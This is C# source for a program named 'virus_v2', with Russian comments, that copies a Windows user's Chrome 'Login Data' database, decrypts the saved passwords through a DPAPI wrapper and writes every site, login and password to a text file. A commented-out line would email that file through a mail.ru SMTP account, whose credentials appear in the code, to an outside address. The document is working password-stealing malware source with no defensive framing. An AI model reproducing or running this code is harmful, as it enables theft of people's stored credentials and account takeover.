
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace virus_v2
{
    class Program
    {
        static void Main(string[] args)
        {


            try
            {
                string path = string.Format( @"C:\Users\{0}\AppData\Local\Google\Chrome\User Data\Default\Login Data",Environment.UserName);
                string path2 = @"D:\Login Data";
                File.Copy(path, path2,true);
               
                string connectionString = $"Data Source = {path2}";
                string fileName = @"output.txt"; // Выходной файл с паролями
                StreamWriter sw = new StreamWriter(fileName, false, Encoding.UTF8);
                string dbWay = "Login Data";
                string db_fields = "logins"; // база паролей SQLITE
                byte[] entropy = null;
                string description;

                DataTable db = new DataTable();
                string sql = $"SELECT * FROM {db_fields}";
                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connection);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(db);
                }


                //DataTable db = new DataTable();
                //string sql = $"SELECT * FROM {db_fields}";
                //using (SqlConnection connection = new SqlConnection(connectionString))
                //{
                //    SqlCommand command = new SqlCommand(sql, connection);
                //    SqlDataAdapter adapter = new SqlDataAdapter(command);
                //    adapter.Fill(db);
                //}
                int rows = db.Rows.Count;
                Console.WriteLine($"Всего записей: {rows}");

                for (int i = 0; i < rows; i++)
                {
                    string url = db.Rows[i][1].ToString();
                    string login = db.Rows[i][3].ToString();
                    byte[] byteArray = (byte[])db.Rows[i][5];
                    byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                    string password = new UTF8Encoding(true).GetString(decrypted);
                    sw.WriteLine("----------------------------");
                    sw.WriteLine($"Номер: {i}");
                    sw.WriteLine($"Сайт: {url}");
                    sw.WriteLine($"Логин: {login}");
                    sw.WriteLine($"Пароль: {password}");
                }
                sw.Close();

                //MailSend.SendMail("smtp.mail.ru", "codeby1@mail.ru", "123qweasd", "hac126@ya.ru", "Пароли", fileName, fileName);
                //  Console.ReadKey();
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }

    internal class DPAPI
    {
        [DllImport("crypt32.dll",
                SetLastError = true,
                CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
        bool CryptProtectData(ref DATA_BLOB pPlainText,
                                    string szDescription,
                                ref DATA_BLOB pEntropy,
                                    IntPtr pReserved,
                                ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
                                    int dwFlags,
                                ref DATA_BLOB pCipherText);

        // Wrapper for DPAPI CryptUnprotectData function.
        [DllImport("crypt32.dll",
                    SetLastError = true,
                    CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
            bool CryptUnprotectData(ref DATA_BLOB pCipherText,
                                    ref string pszDescription,
                                    ref DATA_BLOB pEntropy,
                                        IntPtr pReserved,
                                    ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
                                        int dwFlags,
                                    ref DATA_BLOB pPlainText);

        // BLOB structure used to pass data to DPAPI functions.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }
        static private IntPtr NullPtr = ((IntPtr)((int)(0)));

        // DPAPI key initialization flags.
        private const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;
        private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;

        private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
        {
            ps.cbSize = Marshal.SizeOf(
                                      typeof(CRYPTPROTECT_PROMPTSTRUCT));
            ps.dwPromptFlags = 0;
            ps.hwndApp = NullPtr;
            ps.szPrompt = null;
        }
        private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
        {
            // Use empty array for null parameter.
            if (data == null)
                data = new byte[0];

            // Allocate memory for the BLOB data.
            blob.pbData = Marshal.AllocHGlobal(data.Length);

            // Make sure that memory allocation was successful.
            if (blob.pbData == IntPtr.Zero)
                throw new Exception(
                    "Unable to allocate data buffer for BLOB structure.");

            // Specify number of bytes in the BLOB.
            blob.cbData = data.Length;

            // Copy data from original source to the BLOB structure.
            Marshal.Copy(data, 0, blob.pbData, data.Length);
        }
        public enum KeyType { UserKey = 1, MachineKey };

        // It is reasonable to set default key type to user key.
        private static KeyType defaultKeyType = KeyType.UserKey;
        public static string Encrypt(string plainText)
        {
            return Encrypt(defaultKeyType, plainText, String.Empty,
                            String.Empty);
        }

        public static string Encrypt(KeyType keyType, string plainText)
        {
            return Encrypt(keyType, plainText, String.Empty,
                            String.Empty);
        }

        public static string Encrypt(KeyType keyType,
                                 string plainText,
                                 string entropy)
        {
            return Encrypt(keyType, plainText, entropy, String.Empty);
        }

        public static string Encrypt(KeyType keyType,
                                 string plainText,
                                 string entropy,
                                 string description)
        {
            // Make sure that parameters are valid.
            if (plainText == null) plainText = String.Empty;
            if (entropy == null) entropy = String.Empty;

            // Call encryption routine and convert returned bytes into
            // a base64-encoded value.
            return Convert.ToBase64String(
                    Encrypt(keyType,
                            Encoding.UTF8.GetBytes(plainText),
                            Encoding.UTF8.GetBytes(entropy),
                            description));
        }

        public static byte[] Encrypt(KeyType keyType,
                                byte[] plainTextBytes,
                                byte[] entropyBytes,
                                string description)
        {
            // Make sure that parameters are valid.
            if (plainTextBytes == null) plainTextBytes = new byte[0];
            if (entropyBytes == null) entropyBytes = new byte[0];
            if (description == null) description = String.Empty;

            // Create BLOBs to hold data.
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB cipherTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();

            // We only need prompt structure because it is a required
            // parameter.
            CRYPTPROTECT_PROMPTSTRUCT prompt =
                                      new CRYPTPROTECT_PROMPTSTRUCT();
            InitPrompt(ref prompt);

            try
            {
                // Convert plaintext bytes into a BLOB structure.
                try
                {
                    InitBLOB(plainTextBytes, ref plainTextBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize plaintext BLOB.", ex);
                }

                // Convert entropy bytes into a BLOB structure.
                try
                {
                    InitBLOB(entropyBytes, ref entropyBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize entropy BLOB.", ex);
                }

                // Disable any types of UI.
                int flags = CRYPTPROTECT_UI_FORBIDDEN;

                // When using machine-specific key, set up machine flag.
                if (keyType == KeyType.MachineKey)
                    flags |= CRYPTPROTECT_LOCAL_MACHINE;

                // Call DPAPI to encrypt data.
                bool success = CryptProtectData(ref plainTextBlob,
                                                    description,
                                                ref entropyBlob,
                                                    IntPtr.Zero,
                                                ref prompt,
                                                    flags,
                                                ref cipherTextBlob);
                // Check the result.
                if (!success)
                {
                    // If operation failed, retrieve last Win32 error.
                    int errCode = Marshal.GetLastWin32Error();

                    // Win32Exception will contain error message corresponding
                    // to the Windows error code.
                    throw new Exception(
                        "CryptProtectData failed.", new Win32Exception(errCode));
                }

                // Allocate memory to hold ciphertext.
                byte[] cipherTextBytes = new byte[cipherTextBlob.cbData];

                // Copy ciphertext from the BLOB to a byte array.
                Marshal.Copy(cipherTextBlob.pbData,
                                cipherTextBytes,
                                0,
                                cipherTextBlob.cbData);

                // Return the result.
                return cipherTextBytes;
            }
            catch (Exception ex)
            {
                throw new Exception("DPAPI was unable to encrypt data.", ex);
            }
            // Free all memory allocated for BLOBs.
            finally
            {
                if (plainTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(plainTextBlob.pbData);

                if (cipherTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(cipherTextBlob.pbData);

                if (entropyBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(entropyBlob.pbData);
            }
        }
        public static string Decrypt(string cipherText)
        {
            string description;

            return Decrypt(cipherText, String.Empty, out description);
        }

        public static string Decrypt(string cipherText,
                                out string description)
        {
            return Decrypt(cipherText, String.Empty, out description);
        }

        public static string Decrypt(string cipherText,
                                     string entropy,
                                 out string description)
        {
            // Make sure that parameters are valid.
            if (entropy == null) entropy = String.Empty;

            return Encoding.UTF8.GetString(
                        Decrypt(Convert.FromBase64String(cipherText),
                                    Encoding.UTF8.GetBytes(entropy),
                                out description));
        }
        public static byte[] Decrypt(byte[] cipherTextBytes,
                                    byte[] entropyBytes,
                                out string description)
        {
            // Create BLOBs to hold data.
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB cipherTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();

            // We only need prompt structure because it is a required
            // parameter.
            CRYPTPROTECT_PROMPTSTRUCT prompt =
                                      new CRYPTPROTECT_PROMPTSTRUCT();
            InitPrompt(ref prompt);

            // Initialize description string.
            description = String.Empty;

            try
            {
                // Convert ciphertext bytes into a BLOB structure.
                try
                {
                    InitBLOB(cipherTextBytes, ref cipherTextBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize ciphertext BLOB.", ex);
                }

                // Convert entropy bytes into a BLOB structure.
                try
                {
                    InitBLOB(entropyBytes, ref entropyBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize entropy BLOB.", ex);
                }

                // Disable any types of UI. CryptUnprotectData does not
                // mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of
                // supported flags so we will not set it up.
                int flags = CRYPTPROTECT_UI_FORBIDDEN;

                // Call DPAPI to decrypt data.
                bool success = CryptUnprotectData(ref cipherTextBlob,
                                                  ref description,
                                                  ref entropyBlob,
                                                      IntPtr.Zero,
                                                  ref prompt,
                                                      flags,
                                                  ref plainTextBlob);

                // Check the result.
                if (!success)
                {
                    // If operation failed, retrieve last Win32 error.
                    int errCode = Marshal.GetLastWin32Error();

                    // Win32Exception will contain error message corresponding
                    // to the Windows error code.
                    throw new Exception(
                        "CryptUnprotectData failed.", new Win32Exception(errCode));
                }

                // Allocate memory to hold plaintext.
                byte[] plainTextBytes = new byte[plainTextBlob.cbData];

                // Copy ciphertext from the BLOB to a byte array.
                Marshal.Copy(plainTextBlob.pbData,
                             plainTextBytes,
                             0,
                             plainTextBlob.cbData);

                // Return the result.
                return plainTextBytes;
            }
            catch (Exception ex)
            {
                throw new Exception("DPAPI was unable to decrypt data.", ex);
            }
            // Free all memory allocated for BLOBs.
            finally
            {
                if (plainTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(plainTextBlob.pbData);

                if (cipherTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(cipherTextBlob.pbData);

                if (entropyBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(entropyBlob.pbData);
            }
        }
    }
}






